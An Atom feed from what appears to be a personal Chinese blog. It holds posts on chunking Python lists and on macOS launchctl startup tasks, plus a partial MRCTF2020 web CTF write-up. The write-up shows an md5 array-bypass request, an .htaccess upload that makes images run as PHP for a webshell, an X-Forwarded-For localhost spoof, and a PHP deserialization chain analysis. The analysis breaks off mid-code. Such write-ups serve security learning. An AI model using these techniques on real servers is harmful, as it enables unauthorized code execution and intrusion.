<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xianyu123&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0clickjacking0.github.io/"/>
  <updated>2020-06-02T12:02:21.830Z</updated>
  <id>http://0clickjacking0.github.io/</id>
  
  <author>
    <name>xianyu123</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python将一组数分成每几个一组的一些思考</title>
    <link href="http://0clickjacking0.github.io/2020/06/02/python%E5%B0%86%E4%B8%80%E7%BB%84%E6%95%B0%E5%88%86%E6%88%90%E6%AF%8F%E5%87%A0%E4%B8%AA%E4%B8%80%E7%BB%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://0clickjacking0.github.io/2020/06/02/python将一组数分成每几个一组的一些思考/</id>
    <published>2020-06-02T11:54:18.000Z</published>
    <updated>2020-06-02T12:02:21.830Z</updated>
    
    <content type="html"><![CDATA[<p>python将一组数分成每几个一组的一些思考</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近用python写一个爬虫的时候，突然遇到一个问题：如何将一个list中的数字，分成每几个一组，便有了这篇文章</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">b = []</span><br><span class="line">step = <span class="number">6</span> <span class="comment"># 这里是你选择的几个一组</span></span><br><span class="line">lens = math.ceil(len(a)/step)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,lens):</span><br><span class="line">    print(a[step*i:step*i+step])</span><br></pre></td></tr></table></figure><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>参考自<a href="https://blog.csdn.net/Mr_Cat123/article/details/80584988" target="_blank" rel="noopener">python将一组数分成每3个一组</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">step = <span class="number">3</span></span><br><span class="line">b = [a[i:i+step] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),step)]</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这两种方法的思想都是一样的，本质上就是用切片取出想要数据的范围，只是方法1用了一个变量的动态范围，方法2用了<code>range()</code>函数的<code>step</code>参数，方法2看起来更加简洁明了</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://blog.csdn.net/Mr_Cat123/article/details/80584988" target="_blank" rel="noopener">python将一组数分成每3个一组</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python将一组数分成每几个一组的一些思考&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macos设置开机启动任务</title>
    <link href="http://0clickjacking0.github.io/2020/05/20/macos%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/"/>
    <id>http://0clickjacking0.github.io/2020/05/20/macos设置开机启动任务/</id>
    <published>2020-05-20T01:57:15.000Z</published>
    <updated>2020-05-20T06:07:48.468Z</updated>
    
    <content type="html"><![CDATA[<p>macos设置开机启动任务</p><a id="more"></a><h1 id="方法1——系统偏好设置"><a href="#方法1——系统偏好设置" class="headerlink" title="方法1——系统偏好设置"></a>方法1——系统偏好设置</h1><p>进入系统偏好设置-&gt;帐户-&gt;登陆项</p><p>这个就先不讲了，体验感有点差</p><h1 id="方法2——launchctl"><a href="#方法2——launchctl" class="headerlink" title="方法2——launchctl"></a>方法2——launchctl</h1><p>launchctl是一个统一的服务管理框架，启动、停止和管理守护进程、应用程序、进程和脚本。下面讲述一下如何在Mac上使用launchctl执行定时任务。</p><h2 id="1-plist的作用"><a href="#1-plist的作用" class="headerlink" title="1. plist的作用"></a>1. plist的作用</h2><p>launchctl 将根据plist文件的信息来启动任务。<br> plist脚本一般存放在以下目录：</p><ul><li><code>/Library/LaunchDaemons</code>  –&gt;只要系统启动了，哪怕用户不登陆系统也会被执行</li><li><code>/Library/LaunchAgents</code>  –&gt;当用户登陆系统后才会被执行</li></ul><p>更多的plist存放目录：</p><blockquote><p>~/Library/LaunchAgents 由用户自己定义的任务项<br> /Library/LaunchAgents 由管理员为用户定义的任务项<br> /Library/LaunchDaemons 由管理员定义的守护进程任务项<br> /System/Library/LaunchAgents 由Mac OS X为用户定义的任务项<br> /System/Library/LaunchDaemons 由Mac OS X定义的守护进程任务项</p></blockquote><p>plist文件示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//EN</span></span><br><span class="line"><span class="meta">http://www.apple.com/DTDs/PropertyList-1.0.dtd &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.example.exampled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">string</span>&gt;</span>exampled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于上面plist文件部分键值说明：</p><p><strong>Label (必须)</strong></p><p>该项服务的名称，且文件名必须和Label一致，比如上述的plist文件，文件名就叫<code>com.example.exampled.plist</code></p><p><strong>ProgramArguments</strong></p><p>指定可执行文件路径及其参数，比如执行<code>ls -a</code>，对应到该配置中，应该写作：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>ls<span class="tag">&lt;/<span class="name">string</span>&gt;</span>         </span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>RunAtLoad (可选)</strong></p><p>标识launchd在加载完该项服务之后立即启动路径指定的可执行文件。默认值为 false,设置为 true 即可实现开机运行脚本文件。</p><p><strong>StartCalendarInterval</strong> (可选)</p><p>该关键字可以用来设置定时执行可执行程序，可使用 Month, Day, Hour, Minute, Second等子关键字，它可以指定脚本在多少月，天，小时，分钟，秒，星期几等时间上执行，若缺少某个关键字则表示任意该时间点，类似于 Unix 的 Crontab 计划任务的设置方式，比如在该例子中设置为每小时的20分的时候执行该命令。</p><p><strong>KeepAlive</strong>（可选）</p><p>是否保持持续运行</p><p>所有key关键字详细使用说明可以在Mac OS X终端下使用命令<code>man launchd.plist</code>查询</p><p>更多请参考：<a href="https://www.manpagez.com/man/5/launchd.plist/" target="_blank" rel="noopener">https://www.manpagez.com/man/5/launchd.plist/</a></p><h3 id="launchctl的一些常用的命令"><a href="#launchctl的一些常用的命令" class="headerlink" title="launchctl的一些常用的命令"></a>launchctl的一些常用的命令</h3><p>检测plist文件语法是否有错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plutil local.localhost.startup.plist</span><br></pre></td></tr></table></figure><h4 id="注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo"><a href="#注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo" class="headerlink" title="注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo"></a>注：以下服务如果需要用sudo才能启动的，需要在命令前加入sudo</h4><p>载入配置, 使配置生效</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 加载启动任务</span><br><span class="line">launchctl load ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br><span class="line"></span><br><span class="line"># 加载任务, -w选项会在下次登录/重新启动时重新启动。</span><br><span class="line">launchctl load -w ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br></pre></td></tr></table></figure><p>停止服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl stop &lt;path&gt;</span><br></pre></td></tr></table></figure><p>开始服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl start &lt;path&gt;</span><br></pre></td></tr></table></figure><p>kill服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo launchctl kill &lt;path&gt;</span><br></pre></td></tr></table></figure><p>卸载任务</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 停止并卸载任务。下次登录/重新启动时，任务仍将重新启动。</span><br><span class="line">launchctl unload ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br><span class="line"></span><br><span class="line"># 该任务将不会在下次登录/重新启动时重新启动。</span><br><span class="line">launchctl unload -w ~<span class="regexp">/Library/</span>LaunchAgents/example.plist</span><br></pre></td></tr></table></figure><p>查看服务运行状态</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">launchctl <span class="built_in">list</span></span><br><span class="line">sudo launchctl <span class="built_in">list</span>（有时候一些需要用sudo才能执行的服务就需要用sudo才能查看）</span><br></pre></td></tr></table></figure><p>输出具有以下含义：</p><p>第一个数字是进程的PID，如果它正在运行，如果它不运行，它显示一个’ - ‘。<br>第二个数字是进程的退出代码（如果它已经完成）。如果是负数，则是杀死信号的数量。<br>第三列是进程名称。</p><p>下面这个就说明开机启动nginx服务已经成功了</p><p>注意：执行<code>launchctl</code>命令加<code>sudo</code>与不加结果是完全不同的。</p><p><img src="http://images.xianyu123.club/20200520134958.png" alt="image-20200520134953097"></p><h2 id="2-先用nginx举个🌰"><a href="#2-先用nginx举个🌰" class="headerlink" title="2. 先用nginx举个🌰"></a>2. 先用nginx举个🌰</h2><p>如果你是用<code>homebrew</code>安装的<code>nginx</code>，访问<code>/usr/local/opt/nginx</code>，会发现该目录下有一个文件<code>homebrew.mxcl.nginx.plist</code>，这个就是开机自启动的配置文件，我们只需要把它复制到<code>/Library/LaunchDaemons</code>目录下即可</p><p>然后启动它就好了</p><h2 id="3-拓展"><a href="#3-拓展" class="headerlink" title="3. 拓展"></a>3. 拓展</h2><p>这里我想到了一个问题，就是在mac上我遇到过一些软件会莫名其妙开机自启动，但是在软件的设置地方又找不到取消开机自启动的选项，这样的话我们可以尝试删除这里的plist文件（这只是我的一个设想，还没有实践过😂，逃23333）</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.jianshu.com/p/4addd9b455f2" target="_blank" rel="noopener">Mac中的定时任务利器：launchctl</a></li><li><a href="https://blog.csdn.net/testcs_dn/article/details/80060551" target="_blank" rel="noopener">mac系统，php-fpm加入开机启动项</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macos设置开机启动任务&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>MRCTF2020_web(部分)</title>
    <link href="http://0clickjacking0.github.io/2020/03/29/MRCTF2020-web-%E9%83%A8%E5%88%86/"/>
    <id>http://0clickjacking0.github.io/2020/03/29/MRCTF2020-web-部分/</id>
    <published>2020-03-29T14:24:34.000Z</published>
    <updated>2020-03-29T14:25:42.918Z</updated>
    
    <content type="html"><![CDATA[<p>MRCTF2020_web(部分)</p><a id="more"></a><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>发包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?id[]=123&amp;gg[]=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 15a18ed6-9754-4708-9a84-7e5fbf71561f.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 16</span><br><span class="line"></span><br><span class="line">passwd=1234567\n</span><br></pre></td></tr></table></figure><h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>这里没有过滤<code>.htaccess</code>文件，我们上传一个<code>.htaccess</code>的文件，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>该语句作用是让Apache将其他类型文件均以php格式解析</p><p>这样的话我们上传一张图片，内容为一句话木马，蚁剑连接即可得到flag</p><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>访问flag.php，然后加上<code>X-Forwarded-For:127.0.0.1</code>就可以获得flag</p><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>题目源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先回溯找，怎么样才能得到flag呢？</p><p>我们先看<code>Modifier</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有<code>append</code>方法，存在任意文件包含漏洞，所以怎么才能调用这个方法呢？这里有<code>__invoke</code>方法，我们要能把该类当作函数调用即可触发</p><p>跟进，找到Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只要把<code>$this-&gt;p=new Modifier</code>即可，那么怎么触发<code>__get</code>方法呢？</p><p>当一个对象调用无权限访问到的属性或者不存在的属性的时候就会触发<code>__get</code>方法</p><p>接着跟进Show类中的<code>__toString</code>方法，我们只要<code>$this-&gt;str=new Test</code>即可触发<code>__get</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么怎么触发<code>__toString</code>方法呢？</p><p>当一个类被当作字符串的时候，就会触发该方法</p><p>在Show类中，我们只需要让<code>$this-&gt;source=new Show</code>，这样即可触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    